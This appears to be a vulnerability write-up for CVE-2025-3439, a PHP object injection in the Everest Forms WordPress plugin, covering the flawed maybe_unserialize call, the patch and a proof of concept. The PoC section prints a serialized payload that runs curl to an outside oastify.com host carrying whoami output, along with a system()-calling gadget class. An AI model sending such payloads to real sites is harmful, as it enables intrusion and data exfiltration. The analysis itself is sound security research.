---
title: CVE-2025-3439 Analysis & POC
description: Security Vulnerability in WordPress Everest Forms Plugin.
date: 2025-11-25 19:00:00 +0700
categories: [CVE Analysis]
tags: [analyst, plugin, php object injection]
images: ["app.png"]
featuredImage: "app.png"

lightgallery: true

toc:
    auto: false
---

<!--more-->

## CVE & Basic Info

**Plugin Everest Forms – Contact Form, Quiz, Survey, Newsletter & Payment Form Builder for WordPress** on WordPress contains a **PHP Object Injection** vulnerability in all versions up to and including **3.1.1**, through unsafe unserialization of untrusted data from the parameter `field_value`.
This allows an **unauthenticated attacker** to inject a PHP object. The vulnerable software **does not contain any known POP chain**, meaning the flaw will not lead to practical exploitation unless another plugin or theme on the website contains a compatible POP chain.
If such a POP chain exists through an additional plugin or theme installed on the target system, it may allow the attacker to perform actions such as **arbitrary file deletion**, **data theft**, or even **remote code execution**, depending on the available POP chain.

* **CVE ID**: [CVE-2025-3439](https://www.cve.org/CVERecord?id=CVE-2025-3439)
* **Vulnerability Type**: PHP Object Injection
* **Affected Versions**: <= 3.1.1
* **Patched Versions**: 3.1.2
* **CVSS severity**: High (9.8)
* **Required Privilege**: Unauthenticated
* **Product**: [WordPress Everest Forms Plugin](https://wordpress.org/plugins/everest-forms/)

## Requirements

* **Local WordPress & Debugging**

  * [Virtual Machine](https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/)
  * [Docker](https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/)
* **Plugin Version** - **Everest Forms**:

  * `3.1.1` – **vulnerable**
  * `3.1.2` – **patched**
* **Diff Tool (diff)** → [**Meld**](https://meldmerge.org/) or any other diff tool.

## Cause

**In the vulnerable version (v3.1.1):**

```php {title="html-admin-page-entries-view.php" data-open=true hl_lines=[3]}
if ( ! empty( $field_value ) || is_numeric( $field_value ) ) {
    if ( is_serialized( $field_value ) ) {
        $field_value = maybe_unserialize( $field_value );
    }
    ...
}
```

In this snippet, **`maybe_unserialize()`** is directly executed on user-provided input (`$field_value`). This introduces a critical risk:

* **Object Injection Risk**: If the attacker embeds a PHP object payload within serialized data, the decode and unserialize process will instantiate a malicious object, potentially leading to **Object Injection** and escalation towards **Remote Code Execution (RCE)**.
* **Missing safety validation**: No data validation is performed before unserialization.
* **No fallback handling**: If the input is invalid or malicious, no alternative error processing is performed, leaving the system open to exploitation.

**The patch (v3.1.2):**

![Diff](diff.png "Patch changes")

The patch replaces `maybe_unserialize()` with a safer function `evf_maybe_unserialize()`:

```php {title="evf-core-functions.php" data-open=true hl_lines=[4,5]}
function evf_maybe_unserialize( $data, $options = array() ) {
    if ( is_serialized( $data ) ) {
        if ( version_compare( PHP_VERSION, '7.1.0', '>=' ) ) {
            $options = wp_parse_args( $options, array( 'allowed_classes' => false ) );
            return @unserialize( trim( $data ), $options ); //phpcs:ignore.
        }
        return @unserialize( trim( $data ) ); //phpcs:ignore.
    }

    return $data;
}
```

Using `unserialize()` with `'allowed_classes' => false` completely removes the ability to instantiate objects, effectively eliminating the vulnerability.

## Analysis

The plugin registers a submenu `Entries`:

```php {title="class-evf-admin-menus.php" data-open=true hl_lines=[]}
add_submenu_page( 'everest-forms', esc_html__( 'Everest Forms Entries', 'everest-forms' ), esc_html__( 'Entries', 'everest-forms' ), current_user_can( 'everest_forms_view_entries' ) ? 'everest_forms_view_entries' : 'everest_forms_view_others_entries', 'evf-entries', array( $this, 'entries_page' ) );
```

Callback `entries_page` is executed when accessing this submenu:

```php {title="class-evf-admin-menus.php" data-open=true hl_lines=[]}
public function entries_page() {
    EVF_Admin_Entries::page_output();
}
```

The function calls `page_output()`:

```php {title="class-evf-admin-entries.php" data-open=true hl_lines=[4,5]}
public static function page_output() {
    if ( apply_filters( 'everest_forms_entries_list_actions', false ) ) {
        do_action( 'everest_forms_entries_list_actions_execute' );
    } elseif ( isset( $_GET['view-entry'] ) ) { // phpcs:ignore WordPress.Security.NonceVerification
        include 'views/html-admin-page-entries-view.php';
    } else {
        self::table_list_output();
    }
}
```

When `$_GET['view-entry']` exists, the view `html-admin-page-entries-view.php` is included.

![Entries](entries.png "Entries Page")

This page displays all submitted form input.

```php {title="html-admin-page-entries-view.php" data-open=true hl_lines=[]}
$entry_meta = apply_filters( 'everest_forms_entry_single_data', $entry->meta, $entry, $form_data );
...
foreach ( $entry_meta as $meta_key => $meta_value ) {
    $meta_value = is_serialized( $meta_value ) ? $meta_value : wp_strip_all_tags( $meta_value );
    if ( evf_is_json( $meta_value ) ) {
        $meta_value = json_decode( $meta_value, true );
        $meta_value = $meta_value['value'];
    }
    ...
    $field_value     = apply_filters( 'everest_forms_html_field_value', $meta_value, $entry_meta[ $meta_key ], $entry_meta, 'entry-single' );
    ...
    if ( ! empty( $field_value ) || is_numeric( $field_value ) ) {
        if ( is_serialized( $field_value ) ) {
            $field_value = maybe_unserialize( $field_value );
        }
        ...
    }
    ...
}
```

`$entry_meta` represents user-submitted form data. Each item contains a `meta_key` and a `meta_value`, and the system loops through them:

1. **If the value is JSON**

   * `evf_is_json()` determines whether the string is valid JSON.
   * If yes, `json_decode()` extracts the decoded content via `$meta_value['value']`.

2. **Then `$field_value` is generated**

   * Passed through the filter `everest_forms_html_field_value`.

3. **If serialized**

   * `maybe_unserialize()` is used to decode it — this is the security flaw.

## Flow

{{< mermaid >}}
graph TD

A["User submits form → Data stored in $entry_meta"] --> B["Admin opens Entries page in wp-admin"]
B --> C["entries_page() executed"]
C --> D{"GET['view-entry'] exists?"}
D -->|No| Z["Show entries table"]
D -->|Yes| E["Load html-admin-page-entries-view.php"]

E --> F["foreach ($entry_meta as meta_key => meta_value)"]
F --> G{"Is meta_value JSON?"}
G -->|Yes| H["json_decode() → meta_value['value']"]
G -->|No| I["meta_value = wp_strip_all_tags()"]

H --> J["field_value = apply_filters('everest_forms_html_field_value', meta_value, ...)"]
I --> J

J --> K{"field_value is serialized?"}
K -->|No| L["Display value normally"]
K -->|Yes| M["maybe_unserialize(field_value) ← Vulnerable"]

M --> N{"Unserialize produces object?"}
N -->|Yes| R["Object Injection → Possible exploit if POP chain exists"]
N -->|No| L

{{< /mermaid >}}

## Proof of Concept (PoC)

1. Create a test class in `wp-config.php`:

```php
class Evil
{
    public $command = "ls /";
    public function __destruct()
    {
        die(system($this->command));
    }
}
```

2. Submit a form with JSON-encoded serialized payload:

```http
POST /2025/11/22/test/ HTTP/1.1
Host: localhost
...

Content-Disposition: form-data; name="everest_forms[form_fields][fullname]"

{"value":"a:1:{i:0;O:4:\"Evil\":1:{s:7:\"command\";s:74:\"curl http:\/\/3hl5b0qvv7r0okj81wizv1kmddj47uvj.oastify.com?leadked=$(whoami)\";}}"}
------geckoformboundary8355bd6da3783bb27aa92837fe803a6e
...
```

3. Administrator opens the entry:

![Result](result.png "Result")

## Conclusion

The vulnerability exists because **`maybe_unserialize()` is used directly on user-supplied data without restricting which PHP classes may be instantiated**, leading to **PHP Object Injection**. If a POP chain is present in another plugin or theme, an unauthenticated attacker may escalate to dangerous actions such as reading/writing/deleting files or even remote code execution.
The patch uses `evf_maybe_unserialize()` with `allowed_classes => false`, fully neutralizing the issue.

## Key Takeaways

* **Root cause**: Use of `maybe_unserialize()` on user-controlled data without restricting classes.
* **Impact**: Object Injection, potentially RCE if a compatible POP chain exists.
* **Attack surface**: Triggered when an admin opens the Entries page; malicious payload is already stored.
* **Fix**: Use `unserialize()` with `allowed_classes = false`, preventing object creation.
* **Lesson learned**: Any unserialization must restrict allowed classes or switch to safer formats like JSON.

## References

[Deserialization](https://book.hacktricks.wiki/en/pentesting-web/deserialization/index.html)

[WordPress Everest Forms Plugin <= 3.1.1 is vulnerable to PHP Object Injection](https://patchstack.com/database/wordpress/plugin/everest-forms/vulnerability/wordpress-everest-forms-plugin-3-1-1-unauthenticated-php-object-injection-vulnerability)
